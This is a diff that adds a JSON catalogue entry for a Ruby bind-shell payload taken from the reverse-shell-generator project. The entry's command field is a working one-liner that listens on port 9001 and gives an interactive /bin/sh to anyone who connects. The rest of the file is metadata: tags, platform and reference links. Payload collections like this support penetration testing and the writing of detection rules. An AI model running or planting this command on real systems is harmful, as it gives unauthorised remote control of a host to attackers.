@@ -1,0 +1,30 @@
+{
+  "id": "rsg-bindshell-ruby-bind",
+  "name": "RSG · BindShell · Ruby Bind",
+  "command": "ruby -rsocket -e 'f=TCPServer.new(9001); s=f.accept; [0,1,2].each { |fd| IO.new(fd).reopen(s) }; exec \"/bin/sh -i\"'",
+  "description": "Bind Shell payload — Ruby Bind (via reverse-shell-generator).",
+  "platform": "linux",
+  "tags": [
+    "rsg",
+    "payload",
+    "bind-shell",
+    "bind",
+    "mac",
+    "linux"
+  ],
+  "source": "rsg",
+  "source_url": "https://www.revshells.com/",
+  "upstream_id": "BindShell/Ruby Bind/81",
+  "category": "payloads",
+  "subcategory": "bind-shell",
+  "references": [
+    {
+      "title": "reverse-shell-generator (revshells.com)",
+      "url": "https://www.revshells.com/"
+    },
+    {
+      "title": "reverse-shell-generator GitHub",
+      "url": "https://github.com/0dayCTF/reverse-shell-generator"
+    }
+  ]
+}
